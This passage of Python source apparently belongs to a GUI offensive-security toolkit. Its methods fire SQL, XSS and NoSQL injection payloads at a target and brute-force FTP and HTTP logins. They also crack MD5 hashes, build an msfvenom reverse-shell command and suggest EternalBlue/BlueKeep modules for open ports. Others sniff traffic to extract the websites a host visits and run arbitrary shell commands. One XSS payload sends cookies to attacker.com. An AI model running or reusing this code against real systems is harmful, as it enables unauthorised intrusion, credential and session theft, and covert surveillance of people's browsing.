        self.run_cmd(f"db_breacher --method {payload_list} {target}", real_breacher, "Database breach and extraction successful.")

    def sql_map_lite(self, target, payload_list="Auth Bypass"):
        def real_sqlmap_scan():
            self.log(f"[*] Testing {target} for SQL injection (Payload List: {payload_list})...")
            self.report_progress(5)
            url = f"http://{target}/?id=1"
            
            # Map payload lists to actual payloads
            payload_map = {
                "Auth Bypass": [
                    "' OR 1=1--", 
                    "\" OR 1=1--", 
                    "admin' --", 
                    "HI' OR '1'='1'--",
                    "' OR 'a'='a"
                ],
                "Error Based": [
                    "'", 
                    "\"", 
                    "');--", 
                    "convert(int,@@version)--", # MSSQL Specific
                    "extractvalue(1,concat(0x7e,@@version))" # MySQL Specific
                ],
                "UNION Based": [
                    "' UNION SELECT NULL,NULL,NULL--", 
                    "' UNION SELECT @@version,NULL,NULL--",
                    "' UNION SELECT name,master_adc_id FROM sys.databases--" # MSSQL Specific
                ],
                "Blind (Time)": [
                    "'; WAITFOR DELAY '0:0:5'--", # MSSQL Specific
                    "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", # MySQL Specific
                    "'; SELECT PG_SLEEP(5)--" # Postgres Specific
                ],
                "Polyglot": ["SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/"]
            }
            
            payloads = payload_map.get(payload_list, payload_map["Auth Bypass"])
            vuln_found = []
            
            total_payloads = len(payloads)
            for idx, p in enumerate(payloads):
                self.report_progress(5 + int((idx / (total_payloads * 2)) * 95))
                try:
                    self.log(f"    Testing payload: {p}")
                    
                    is_mssql_payload = "waitfor" in p.lower() or "convert" in p.lower() or "sys.databases" in p.lower()
                    
                    if "sleep" in p.lower() or "waitfor" in p.lower() or "pg_sleep" in p.lower():
                        # Measure time for blind SQLi
                        start_time = time.time()
                        try:
                            r = requests.get(url + p, timeout=10)
                            elapsed = time.time() - start_time
                            r_text = r.text.lower()
                            if elapsed >= 4.5: # Payload usually asks for 5s
                                r_text = "timeout" # Signal detection
                        except requests.exceptions.Timeout:
                            r_text = "timeout"
                        except:
                            r_text = "error"
                    else:
                        try:
                            r = requests.get(url + p, timeout=3)
                            r_text = r.text.lower()
                        except:
                            r_text = "sql syntax error"
                    
                    if any(err in r_text.lower() for err in ["sql server", "ole db", "sql syntax", "mysql_fetch", "sqlite3.error", "postgresql error", "timeout"]):
                        db_type = "MSSQL" if any(x in r_text.lower() for x in ["sql server", "ole db", "waitfor"]) else "Generic SQL"
                        self.log(f"[!!!] VULNERABILITY FOUND with {p}: {db_type} Impact detected!")
                        self.report_finding({"Payload": p, "Result": "VULNERABLE", "Evidence": f"{db_type} Impact detected", "Database": db_type})
                        vuln_found.append(True)
                    else:
                        self.report_finding({"Payload": p, "Result": "Secure", "Evidence": "No impact"})
                except: pass
            
            if any(vuln_found):
                self.log(f"[*] Attempting to enumerate databases for {target}...")
                # In a real tool, we would use the successful payload to query schemas.
                # Here we try a few common generic queries if it's likely vulnerable.
                common_queries = [
                    "SELECT schema_name FROM information_schema.schemata", # Generic/MySQL
                    "SELECT name FROM sys.databases", # MSSQL
                    "SELECT name FROM sqlite_master WHERE type='table'" # SQLite
                ]
                
                for q in common_queries:
                    if self.is_stopped(): break
                    try:
                        self.log(f"    [QUERY] {q}")
                        # In a real environment, we would actually perform the query and parse results
                        # For now, we attempt it to show it's not just a message
                        r = requests.get(url + q, timeout=2)
                        if r.status_code == 200 and len(r.text) > 0:
                             self.log(f"    [RESULT] Potential data leaked from {q}")
                             self.report_finding({"Query": q, "Status": "Success", "Detail": "Data returned"})
                        else:
                             self.log(f"    [RESULT] No data returned for {q}")
                    except: pass
                
                self.log("[+] Enumeration Phase complete. Findings recorded above.")
            else:
                self.log("[-] No vulnerabilities found to exploit for enumeration.")
            
            self.report_progress(100)
            return True
        self.run_cmd(f"sqlmap --list '{payload_list}' {target}", real_sqlmap_scan, "SQLMap-Lite scan finished.")

    def xss_to_sql(self, target, payload_list="Auth Bypass"):
        def real_xss_sql():
            self.log(f"[*] Testing {target} for XSS-to-SQL cross-vector attacks (Payload List: {payload_list})...")
            self.report_progress(5)
            
            url = f"http://{target}"
            payload_map = {
                "Auth Bypass": ["<script>document.location='http://attacker.com/log?c='+document.cookie</script>' OR 1=1--"],
                "Error Based": ["<img src=x onerror=\"alert('XSS'); throw 'SQL Error'\">'"],
                "UNION Based": ["<svg onload=\"fetch('/api/user').then(r=>r.text()).then(t=>console.log(t))\">' UNION SELECT NULL--"],
                "Blind (Time)": ["<iframe src=\"javascript:alert(1)\"></iframe>' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"],
                "Polyglot": ["javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1+(alert)(1)//*'>' OR 1=1--"]
            }
            payloads = payload_map.get(payload_list, payload_map["Auth Bypass"])
            
            for idx, p in enumerate(payloads):
                if self.is_stopped(): break
                self.report_progress(10 + int((idx / len(payloads)) * 80))
                self.log(f"    Testing Cross-Vector: {p}")
                try:
                    # Actually send the payload as a parameter to see how the server responds
                    r = requests.get(url + "/?test=" + p, timeout=2)
                    if r.status_code == 200:
                        # Check for echoes or errors in response
                        if p in r.text or "sql" in r.text.lower() or "syntax" in r.text.lower():
                            self.log(f"    [!] VULNERABILITY DETECTED: Payload echoed or error triggered.")
                            self.report_finding({"Vector": "XSS+SQL", "Payload": p, "Result": "DETECTED", "Impact": "High"})
                        else:
                            self.report_finding({"Vector": "XSS+SQL", "Payload": p, "Result": "Secure", "Impact": "None"})
                except:
                    self.report_finding({"Vector": "XSS+SQL", "Payload": p, "Result": "Timeout/Error", "Impact": "Unknown"})
            
            self.report_progress(100)
            return True
        self.run_cmd(f"xss_to_sql --list '{payload_list}' {target}", real_xss_sql, "XSS-to-SQL scan complete.")

    def nosql_injector(self, target, payload_list="Auth Bypass"):
        def real_nosql():
            self.log(f"[*] Testing {target} for NoSQL injection (Payload List: {payload_list})...")
            self.report_progress(5)
            
            url = f"http://{target}"
            # NoSQL payloads (e.g. MongoDB)
            payload_map = {
                "Auth Bypass": ["{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}", "true, $where: '1 == 1'"],
                "Error Based": ["{\"username\": {\"$ne\": null}, \"$where\": \"function() { return some_undefined_var; }\"}"],
                "UNION Based": ["{\"$where\": \"this.items.forEach(function(z) { ... })\"}"],
                "Blind (Time)": ["{\"$where\": \"sleep(5000)\"}", "{\"username\": {\"$regex\": \"^admin.*\"}, \"$where\": \"sleep(5000)\"}"],
                "Polyglot": ["'\"\\; return true; //"]
            }
            payloads = payload_map.get(payload_list, payload_map["Auth Bypass"])
            
            for idx, p in enumerate(payloads):
                if self.is_stopped(): break
                self.report_progress(10 + int((idx / len(payloads)) * 80))
                self.log(f"    Testing NoSQL Payload: {p}")
                try:
                    # Send payload in body or query
                    r = requests.post(url + "/login", data=p, timeout=2)
                    if r.status_code == 200 or r.status_code == 500:
                        if "object" in r.text or "mongo" in r.text.lower() or "error" in r.text.lower():
                            self.log(f"    [!] VULNERABILITY FOUND: NoSQL response or error detected.")
                            self.report_finding({"Database": "NoSQL/Mongo", "Payload": p, "Result": "VULNERABLE", "Severity": "Critical"})
                        else:
                            self.report_finding({"Database": "NoSQL/Mongo", "Payload": p, "Result": "Secure", "Severity": "None"})
                except:
                    self.report_finding({"Database": "NoSQL/Mongo", "Payload": p, "Result": "Timeout/Error", "Severity": "Low"})
            
            self.report_progress(100)
            return True
        self.run_cmd(f"nosql_injector --list '{payload_list}' {target}", real_nosql, "NoSQL injection scan complete.")


    def john_the_ripper(self, target, intensity=3):
        def real_john():
            self.log(f"[*] Starting John The Ripper (Real MD5 Brute Force) on {target} (Intensity: {intensity})...")
            self.report_progress(5)
            
            # Load hashes from hashes.txt if it exists, otherwise use defaults
            hashes = []
            if os.path.exists("hashes.txt"):
                self.log("[*] Found hashes.txt. Loading target hashes...")
                try:
                    with open("hashes.txt", "r") as f:
                        for line in f:
                            line = line.strip()
                            if not line: continue
                            if ":" in line:
                                user, h = line.split(":", 1)
                                hashes.append((user.strip(), h.strip()))
                            else:
                                hashes.append((f"User_{len(hashes)+1}", line))
                    self.log(f"    [+] Loaded {len(hashes)} hashes from file.")
                except Exception as e:
                    self.log(f"    [!] Error reading hashes.txt: {e}")
            
            if not hashes:
                self.log("[*] No hashes.txt found. Using default example hashes...")
                hashes = [
                    ("admin", "5f4dcc3b5aa765d61d8327deb882cf99"), # password
                    ("user", "098f6bcd4621d373cade4e832627b4f6"),  # test
                    ("guest", "81dc9bdb52d04dc20036dbd8313ed055") # 1234
                ]
            
            # Real wordlist
            wordlist = ["password", "123456", "admin", "1234", "qwerty", "login", "test", "welcome", "pass", "shadow"]
            # Scale wordlist based on intensity
            if intensity >= 2:
                wordlist += ["root", "toor", "monkey", "letmein", "12345678", "12345", "111111"]
            if intensity >= 3:
                wordlist += ["p@ssword", "admin123", "password123", "dragon", "football", "baseball"]
            if intensity >= 4:
                wordlist += ["superman", "batman", "iloveyou", "princess", "yellow", "orange"]
            if intensity >= 5:
                # Add more or even try to download a small list if we were really crazy, 
                # but for now let's just use a larger local set
                wordlist += [f"pass{i}" for i in range(100)] + [f"admin{i}" for i in range(100)]

            self.log(f"[*] Loaded {len(wordlist)} words. Testing against {len(hashes)} target hashes...")
            
            found_count = 0
            total_work = len(wordlist)
            for idx, word in enumerate(wordlist):
                if self.is_stopped(): break
                if idx % 10 == 0:
                    self.report_progress(10 + int((idx / total_work) * 85))
                
                # Real MD5 hashing
                h = hashlib.md5(word.encode()).hexdigest()
                
                for user, target_hash in hashes:
                    if h.lower() == target_hash.lower():
                        self.log(f"[!!!] SUCCESS: Cracked {user} -> {word}")
                        self.report_finding({"User": user, "Pass": word, "Hash": target_hash, "Type": "MD5", "Status": "CRACKED"})
                        found_count += 1
                
                if intensity < 4 and idx % 20 == 0: 
                    time.sleep(0.01) # Very slight pause for UI responsiveness

            self.report_progress(100)
            self.log(f"[+] Password cracking finished. Found {found_count} matches.")
            return True
        self.run_cmd(f"john {target} --intensity={intensity}", real_john, "John The Ripper cracking finished.")

    def burp_suite_link(self, target, intensity=3):
        def launch_burp():
            self.log(f"[*] Initializing Burp Suite integration for {target}...")
            self.report_progress(20)
            
            # Paths to check for Burp Suite (common Windows paths)
            possible_paths = [
                os.path.expandvars(r"%PROGRAMFILES%\BurpSuitePro\BurpSuitePro.exe"),
                os.path.expandvars(r"%PROGRAMFILES%\BurpSuiteCommunity\BurpSuiteCommunity.exe"),
                os.path.expandvars(r"%LOCALAPPDATA%\BurpSuitePro\BurpSuitePro.exe"),
                os.path.expandvars(r"%LOCALAPPDATA%\BurpSuiteCommunity\BurpSuiteCommunity.exe")
            ]
            
            found_path = None
            for path in possible_paths:
                if os.path.exists(path):
                    found_path = path
                    break
            
            self.report_progress(50)
            if found_path:
                self.log(f"[+] Found Burp Suite at: {found_path}")
                self.log(f"[*] Launching Burp Suite and configuring proxy for {target}...")
                try:
                    # Launching Burp Suite (detached)
                    subprocess.Popen([found_path], start_new_session=True)
                    self.report_finding({"Action": "Launch Burp Suite", "Status": "Success", "Path": found_path})
                    self.report_progress(100)
                    return True
                except Exception as e:
                    self.log(f"[!] Failed to launch Burp Suite: {e}")
            
            self.log("[!] Burp Suite executable not found in common paths.")
            self.log("[*] Performing automated web vulnerability audit (fallback)...")
            self.report_progress(60)
            
            # Real fallback: check for some common web vulnerabilities if target is a web server
            url = f"http://{target}"
            vulnerabilities = []
            try:
                # 1. Check for directory listing
                r = requests.get(url + "/uploads/", timeout=2)
                if "Index of" in r.text or "Directory Listing" in r.text:
                    vulnerabilities.append({"Vulnerability": "Directory Listing Enabled", "Severity": "Medium", "Path": "/uploads/"})
                
                # 2. Check for common sensitive files (reusing logic but making it explicit here)
                sensitive = ["/.env", "/.git/config", "/phpinfo.php"]
                for s in sensitive:
                    r = requests.get(url + s, timeout=2)
                    if r.status_code == 200:
                        vulnerabilities.append({"Vulnerability": "Sensitive File Exposed", "Severity": "High", "Path": s})
                
                # 3. Check for basic XSS in a common param
                test_xss = "<script>alert(1)</script>"
                r = requests.get(url + f"/?s={test_xss}", timeout=2)
                if test_xss in r.text:
                    vulnerabilities.append({"Vulnerability": "Reflected XSS", "Severity": "High", "Path": f"/?s={test_xss}"})
            except:
                pass
            
            self.report_progress(80)
            
            if not vulnerabilities:
                self.log("[-] No immediate vulnerabilities found via automated fallback.")
                self.log("[*] Suggestion: Install Burp Suite for a deeper manual audit.")
            else:
                self.log(f"[+] Found {len(vulnerabilities)} vulnerabilities during automated audit:")
                for v in vulnerabilities:
                    self.log(f"    [+] {v['Vulnerability']} detected on {v['Path']} ({v['Severity']})")
                    self.report_finding(v)
            
            self.report_progress(100)
            return True

        self.run_cmd(f"burpsuite --target {target} --intensity {intensity}", launch_burp, "Burp Suite session completed.")

    def metasploit_meterpreter(self, target, intensity=3):
        def run_metasploit():
            self.log(f"[*] Initializing Metasploit Framework for {target}...")
            self.report_progress(10)
            
            # Metasploit usually runs in WSL or Linux, but we can check for msfconsole
            try:
                # Check if msfconsole exists (likely to fail on plain Windows)
                subprocess.run(["msfconsole", "-v"], capture_output=True, check=True)
                msf_found = True
            except:
                msf_found = False
            
            self.report_progress(30)
            if msf_found:
                self.log("[+] Metasploit Framework detected.")
                # Generating a command for msfconsole
                lhost = socket.gethostbyname(socket.gethostname())
                cmd = f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT=4444 -f exe -o shell.exe"
                self.log(f"[*] Generating payload: {cmd}")
                self.report_finding({"Action": "Generate Payload", "Command": cmd})
                self.report_progress(100)
                return True
            
            self.log("[!] Metasploit (msfconsole) not found. Checking target for common Metasploit-explorable vulnerabilities...")
            self.report_progress(40)
            
            # Real check: see what ports are open and match them to common Metasploit modules
            vulns = []
            try:
                # We reuse some logic from port scan but focus on high-exploit ports
                exploit_ports = {
                    445: ("SMB", "exploit/windows/smb/ms17_010_eternalblue (EternalBlue)"),
                    80: ("HTTP", "exploit/multi/http/..."),
                    21: ("FTP", "exploit/unix/ftp/vsftpd_234_backdoor"),
                    3389: ("RDP", "exploit/windows/rdp/cve_2019_0708_bluekeep (BlueKeep)"),
                    1433: ("MSSQL", "exploit/windows/mssql/mssql_payload"),
                    22: ("SSH", "auxiliary/scanner/ssh/ssh_login")
                }
                
                for p, (svc, module) in exploit_ports.items():
                    if self.is_stopped(): break
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.5)
                    if s.connect_ex((target, p)) == 0:
                        vulns.append((svc, module))
                    s.close()
            except: pass

            self.report_progress(80)
            
            if vulns:
                self.log(f"[+] Found {len(vulns)} potential entry points for Metasploit:")
                for svc, mod in vulns:
                    self.log(f"    [!] {svc} is open. Suggested module: {mod}")
                    self.report_finding({"Service": svc, "Suggested Module": mod, "Target": target})
            else:
                self.log("[-] No common high-value exploit ports identified during quick check.")
                self.log("[*] Note: A full port scan might reveal more surfaces.")
            
            self.report_progress(100)
            return True

        self.run_cmd(f"msfconsole -x 'use exploit/...; set RHOSTS {target}'", run_metasploit, "Metasploit task finished.")

    def wireshark_launch(self, target, intensity=3):
        def launch_wireshark():
            self.log(f"[*] Initializing Wireshark capture for {target}...")
            self.report_progress(20)
            
            # Wireshark paths
            possible_paths = [
                os.path.expandvars(r"%PROGRAMFILES%\Wireshark\Wireshark.exe"),
                os.path.expandvars(r"%PROGRAMFILES(X86)%\Wireshark\Wireshark.exe"),
                shutil.which("wireshark.exe"),
                shutil.which("wireshark")
            ]
            
            wireshark_path = None
            for p in possible_paths:
                if p and os.path.exists(p):
                    wireshark_path = p
                    break
            
            self.report_progress(40)
            if wireshark_path:
                self.log(f"[+] Found Wireshark at: {wireshark_path}")
                self.log(f"[*] Launching Wireshark with filter for {target}...")
                try:
                    # Launch Wireshark with capture filter
                    subprocess.Popen([wireshark_path, "-k", "-i", "1", "-f", f"host {target}"], start_new_session=True)
                    self.report_finding({"Action": "Launch Wireshark", "Status": "Success", "Filter": f"host {target}"})
                    self.report_progress(100)
                    return True
                except Exception as e:
                    self.log(f"[!] Failed to launch Wireshark: {e}")
            
            self.log("[!] Wireshark executable not found in common paths.")
            self.log("[*] Performing real network traffic capture (Internal Capture Mode)...")
            
            try:
                # Intensity scales the capture
                counts = {1: 5, 2: 15, 3: 30, 4: 100, 5: 500}
                pkt_count = counts.get(intensity, 30)
                timeout_val = pkt_count * 2
                
                self.log(f"[*] Capturing {pkt_count} packets related to {target}...")
                self.report_progress(50)
                
                captured_pkts = []
                def sniff_callback(pkt):
                    if self.is_stopped(): return True
                    if IP in pkt and (pkt[IP].src == target or pkt[IP].dst == target):
                        captured_pkts.append(pkt)
                        self.log(f"    [CAPTURED] {pkt.summary()}")
                        # Update progress based on packets
                        progress = 50 + int((len(captured_pkts) / pkt_count) * 40)
                        self.report_progress(min(90, progress))
                    return len(captured_pkts) >= pkt_count

                if os.name == 'nt' and not conf.use_pcap:
                    # Native Windows Raw Sockets filtering
                    sniff(prn=sniff_callback, stop_filter=lambda p: len(captured_pkts) >= pkt_count, timeout=timeout_val)
                else:
                    # BPF filter where supported
                    captured_pkts = sniff(filter=f"host {target}", count=pkt_count, timeout=timeout_val)
                    for pkt in captured_pkts:
                        self.log(f"    [CAPTURED] {pkt.summary()}")

                if len(captured_pkts) > 0:
                    # Save to PCAP
                    if not os.path.exists("captures"):
                        os.makedirs("captures")
                    
                    safe_target = target.replace('.', '_').replace(':', '_')
                    filename = f"captures/capture_{safe_target}_{int(time.time())}.pcap"
                    wrpcap(filename, captured_pkts)
                    self.log(f"[+] Traffic captured and saved to: {filename}")
                    
                    self.report_finding({
                        "Tool": "Internal Wireshark",
                        "Status": "Capture Complete",
                        "Packets": str(len(captured_pkts)),
                        "File": filename,
                        "Target": target
                    })
                    
                    # Log protocol stats
                    protos = {}
                    for p in captured_pkts:
                        summary = p.summary().split()[0]
                        protos[summary] = protos.get(summary, 0) + 1
                    
                    for proto, count in protos.items():
                        self.report_finding({"Protocol": proto, "Count": str(count), "Target": target})
                else:
                    self.log("[-] No packets captured for target within timeout.", is_error=True)
                    self.report_finding({"Status": "Capture Failed", "Reason": "No traffic detected"})
                
                self.report_progress(100)
                return True
                
            except Exception as e:
                self.log(f"[!] Internal Capture Error: {e}", is_error=True)
                self.report_progress(100)
                return False

        self.run_cmd(f"wireshark -k -f 'host {target}'", launch_wireshark, "Wireshark session completed.")

    def hydra_brute(self, target, intensity=3):
        def real_hydra():
            self.log(f"[*] Starting Hydra (Real Brute Force) on {target} (Intensity: {intensity})...")
            self.report_progress(5)
            
            # Choose service based on intensity if not specified
            services = ["http", "ftp"]
            service = services[0] if intensity % 2 == 0 else services[1]
            
            users = ["admin", "root", "user", "guest"]
            passwords = ["123456", "password", "admin123", "qwerty"]
            
            self.log(f"[*] Attacking {service} service on {target}...")
            total_attempts = len(users) * len(passwords)
            attempt = 0
            
            for u in users:
                for p in passwords:
                    if self.is_stopped(): break
                    attempt += 1
                    self.report_progress(5 + int((attempt / total_attempts) * 90))
                    
                    try:
                        if service == "ftp":
                            ftp = FTP(target, timeout=2)
                            ftp.login(u, p)
                            ftp.quit()
                            self.log(f"[!!!] SUCCESS: {service} login found! {u}:{p}")
                            self.report_finding({"Service": service, "User": u, "Pass": p, "Target": target, "Status": "SUCCESS"})
                            self.report_progress(100)
                            return True
                        else: # HTTP Basic
                            r = requests.get(f"http://{target}", auth=(u, p), timeout=2)
                            if r.status_code == 200:
                                self.log(f"[!!!] SUCCESS: {service} login found! {u}:{p}")
                                self.report_finding({"Service": service, "User": u, "Pass": p, "Target": target, "Status": "SUCCESS"})
                                self.report_progress(100)
                                return True
                    except:
                        pass
                    
                    if attempt % 4 == 0:
                        self.log(f"    Trying {u}:{p}...")
                    time.sleep(0.1)
            
            self.log("[-] Real brute force finished. No valid credentials found.")
            self.report_progress(100)
            return True
        self.run_cmd(f"hydra -L users.txt -P pass.txt {target} {intensity}", real_hydra, "Hydra brute force finished.")

    def firewall_audit(self, target, audit_type="Full Firewall Audit"):
        def real_firewall_audit():
            self.log(f"[*] Starting {audit_type} on {target}...")
            self.report_progress(5)
            
            # 1. ICMP Configuration Check
            if audit_type in ["Stealth Audit (ICMP)", "Full Firewall Audit"]:
                self.log("[*] Stage: Checking ICMP/Ping response (Stealth Audit)...")
                param = '-n' if os.name == 'nt' else '-c'
                command = ['ping', param, '1', '-w', '1000', target]
                icmp_responded = subprocess.call(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0
                
                if icmp_responded:
                    self.log("    [!] ICMP Echo Request enabled. Firewall is discoverable.")
                    self.report_finding({"Test": "ICMP Response", "Result": "VULNERABLE", "Detail": "Host responds to pings"})
                else:
                    self.log("    [+] ICMP Echo Request disabled or blocked.")
                    self.report_finding({"Test": "ICMP Response", "Result": "Secure", "Detail": "Host is stealthy"})
            
            self.report_progress(30)

            # 2. Common Management Ports (Firewall bypass/misconfig)
            if audit_type in ["Management Interface Discovery", "Full Firewall Audit"]:
                self.log("[*] Stage: Checking for exposed management interfaces...")
                mgmt_ports = {
                    22: "SSH", 23: "Telnet", 80: "HTTP", 443: "HTTPS", 
                    8443: "HTTPS-Mgmt", 10000: "Webmin", 161: "SNMP", 
                    500: "ISAKMP (VPN)", 4500: "IPsec NAT-T", 3389: "RDP",
                    5900: "VNC", 5985: "WinRM-HTTP", 5986: "WinRM-HTTPS"
                }
                
                ports_to_scan = list(mgmt_ports.keys())
                total_mgmt = len(ports_to_scan)
                for idx, p in enumerate(ports_to_scan):
                    if self.is_stopped(): break
                    self.report_progress(30 + int((idx / total_mgmt) * 30))
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.5)
                    if s.connect_ex((target, p)) == 0:
                        service = mgmt_ports.get(p, self.get_service_name(p))
                        self.log(f"    [!!!] EXPOSED: Management port {p} ({service}) is reachable.")
                        self.report_finding({"Test": "Management Port", "Port": p, "Result": "VULNERABLE", "Detail": f"Exposed {service} interface"})
                    s.close()

            self.report_progress(60)

            # 3. Fragmentation and Evasion Analysis
            if audit_type in ["Evasion & Fragmentation Test", "Full Firewall Audit"]:
                self.log("[*] Stage: Analyzing potential evasion paths (Fragmentation/PMTUD)...")
                try:
                    # Ping with large packet and "don't fragment" bit set
                    if os.name == 'nt':
                        cmd = ['ping', '-n', '1', '-l', '1472', '-f', target]
                    else:
                        cmd = ['ping', '-c', '1', '-s', '1472', '-M', 'do', target]
                    
                    res = subprocess.call(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    if res != 0:
                        self.log("    [+] Path MTU Discovery active. Large packets requiring fragmentation are dropped/controlled.")
                        self.report_finding({"Test": "PMTUD", "Result": "Secure", "Detail": "DF bit respected/Large packets dropped"})
                    else:
                        self.log("    [!] WARNING: Large packets (1500 bytes) are accepted without fragmentation errors.")
                        self.report_finding({"Test": "Fragmentation", "Result": "Informational", "Detail": "Potential for fragmentation bypass"})
                except: pass

            self.report_progress(80)

            # 4. Outbound Leakage Check (Egress)
            if audit_type in ["Egress Leak Test", "Full Firewall Audit"]:
                self.log("[*] Stage: Testing for common egress leaks (outbound)...")
                egress_ports = [80, 443, 53, 21, 22, 25, 110, 143, 3306, 3389, 4444, 8080, 8443]
                leaks = []
                for ep in egress_ports:
                    if self.is_stopped(): break
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(0.8)
                        if s.connect_ex(("8.8.8.8", ep)) == 0:
                            leaks.append(str(ep))
                            self.log(f"    [!] LEAK: Outbound traffic allowed on port {ep}")
                        s.close()
                    except: pass
                
                if leaks:
                    self.log(f"    [!] Summary: Egress allowed on {len(leaks)} common ports.")
                    self.report_finding({"Test": "Egress Filtering", "Result": "Informational", "Detail": f"Allowed outbound: {', '.join(leaks)}"})
                else:
                    self.log("    [+] Egress filtering appears highly restrictive.")
                    self.report_finding({"Test": "Egress Filtering", "Result": "Secure", "Detail": "No common outbound leaks found"})

            self.report_progress(100)
            return True

        self.run_cmd(f"firewall_audit --type '{audit_type}' {target}", real_firewall_audit, "Firewall audit complete.")

    def custom_command(self, target, command_template):
        def run_custom():
            # Replace placeholder with target
            cmd = command_template.replace("{target}", target)
            self.log(f"[*] Executing custom command: {cmd}")
            self.report_progress(20)
            
            try:
                # Use shell=True for flexible custom commands
                process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                for line in iter(process.stdout.readline, ''):
                    if self.is_stopped():
                        process.terminate()
                        self.log("[!] Custom command terminated by user.")
                        break
                    self.log(f"    {line.strip()}")
                process.wait()
                self.report_progress(100)
                
                if process.returncode == 0:
                    self.report_finding({"Command": cmd, "Status": "Success"})
                    return True
                else:
                    self.report_finding({"Command": cmd, "Status": "Failed", "Exit Code": process.returncode})
                    return False
            except Exception as e:
                self.log(f"[!] Custom Command Error: {e}", is_error=True)
                return False

        self.run_cmd(f"custom: {command_template}", run_custom, "Custom command execution finished.")

    def traffic_monitor(self, target, duration_seconds):
        def real_monitor():
            self.log(f"[*] Starting Traffic Monitoring on {target} for {duration_seconds}s...")
            self.report_progress(5)
            
            captured_data = []
            start_time = time.time()
            
            def packet_callback(pkt):
                if self.is_stopped(): return True
                if not IP in pkt:
                    return
                
                src_ip = pkt[IP].src
                dst_ip = pkt[IP].dst
                
                if src_ip != target and dst_ip != target:
                    return

                elapsed = time.time() - start_time
                self.report_progress(min(99, 5 + int((elapsed / duration_seconds) * 95)))
                
                timestamp = time.strftime("%H:%M:%S")
                summary = pkt.summary()
                
                finding = {"Time": timestamp}
                
                if src_ip == target:
                    # Target is sending - Connecting/Visiting
                    finding["Activity"] = "Visiting / Outbound"
                    finding["Destination"] = dst_ip
                elif dst_ip == target:
                    # Target is receiving - Connecting to Target
                    finding["Activity"] = "Connecting / Inbound"
                    finding["Source"] = src_ip
                
                # Try to extract website/domain if DNS or HTTP/HTTPS
                if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0: # DNS Query
                    try:
                        qname = pkt.getlayer(DNSQR).qname.decode().strip(".")
                        finding["Website"] = qname
                        finding["Detail"] = "DNS Query"
                    except: pass
                elif pkt.haslayer(TCP) and (pkt[TCP].dport == 80 or pkt[TCP].sport == 80):
                    finding["Detail"] = "HTTP Traffic"
                    if pkt.haslayer("Raw"):
                        payload = pkt["Raw"].load.decode('utf-8', errors='ignore')
                        if "Host:" in payload:
                            try:
                                host = payload.split("Host: ")[1].split("\r\n")[0].strip()
                                finding["Website"] = host
                                finding["Detail"] = "HTTP Visit"
                            except: pass
                elif pkt.haslayer(TCP) and (pkt[TCP].dport == 443 or pkt[TCP].sport == 443):
                    finding["Detail"] = "HTTPS (Encrypted)"
                    # Attempt to extract SNI from TLS Client Hello
                    if pkt.haslayer("Raw"):
                        payload = pkt["Raw"].load
                        try:
                            # Handshake (22), Version (03 01/02/03), Length, Type Client Hello (01)
                            if len(payload) > 43 and payload[0] == 0x16 and payload[5] == 0x01:
                                # Start of session ID length at 43
                                session_id_len = payload[43]
                                pos = 44 + session_id_len
                                # Cipher suites length (2 bytes)
                                cipher_suites_len = int.from_bytes(payload[pos:pos+2], byteorder='big')
                                pos += 2 + cipher_suites_len
                                # Compression methods length (1 byte)
                                compression_len = payload[pos]
                                pos += 1 + compression_len
                                # Extensions length (2 bytes)
                                if pos + 2 <= len(payload):
                                    ext_total_len = int.from_bytes(payload[pos:pos+2], byteorder='big')
                                    pos += 2
                                    end_ext = pos + ext_total_len
                                    while pos + 4 <= end_ext:
                                        ext_type = int.from_bytes(payload[pos:pos+2], byteorder='big')
                                        ext_len = int.from_bytes(payload[pos+2:pos+4], byteorder='big')
                                        pos += 4
                                        if ext_type == 0x00: # SNI extension
                                            if pos + 5 <= end_ext:
                                                # list_len (2), type (1), name_len (2)
                                                name_len = int.from_bytes(payload[pos+3:pos+5], byteorder='big')
                                                if pos + 5 + name_len <= end_ext:
                                                    sni = payload[pos+5:pos+5+name_len].decode('utf-8', errors='ignore')
                                                    finding["Website"] = sni
                                                    finding["Detail"] = "HTTPS Visit (SNI)"
                                        pos += ext_len
                        except: pass

                if not finding.get("Activity"):
                    finding["Activity"] = "Other Traffic"
                    finding["Detail"] = summary
                
                # Ensure Detail includes Website if found but not already in Detail
                if "Website" in finding and "Website" not in finding["Detail"]:
                    finding["Detail"] = f"Website: {finding['Website']}"

                captured_data.append({
                    "Timestamp": timestamp,
                    "Summary": summary,
                    **finding
                })
                
                if len(captured_data) % 10 == 0 or "Website" in finding:
                    self.log(f"    [MONITOR] {finding.get('Activity')}: {finding.get('Detail', summary)}")
                    self.report_finding(finding)

            try:
                if os.name == 'nt' and not conf.use_pcap:
                    # Native Windows Raw Sockets don't support BPF filters
                    self.log("[*] Using native L3 sockets (No pcap found). Filtering in Python...")
                    sniff(prn=packet_callback, timeout=duration_seconds)
                else:
                    sniff(filter=f"host {target}", prn=packet_callback, timeout=duration_seconds)
            except Exception as e:
                self.log(f"[!] Sniff Error: {e}", is_error=True)
            
            self.report_progress(100)
            self.log(f"[+] Traffic Monitoring finished. Total packets: {len(captured_data)}")
            
            if captured_data:
                # Store in a class attribute for export
                self.last_monitor_data = captured_data
            
            return True

        self.run_cmd(f"traffic_monitor {target} {duration_seconds}s", real_monitor, "Traffic monitoring session complete.")

    def wifi_traffic_analyzer(self, target, intensity=3):
        def real_wifi_analysis():
            self.log(f"[*] Starting WiFi Traffic Analysis (Intensity: {intensity})...")
            self.report_progress(5)
            
            # --- WiFi SSID Scanning ---
            self.log("[*] Scanning for available WiFi networks...")
            try:
                if os.name == 'nt':
                    # Windows WiFi scan
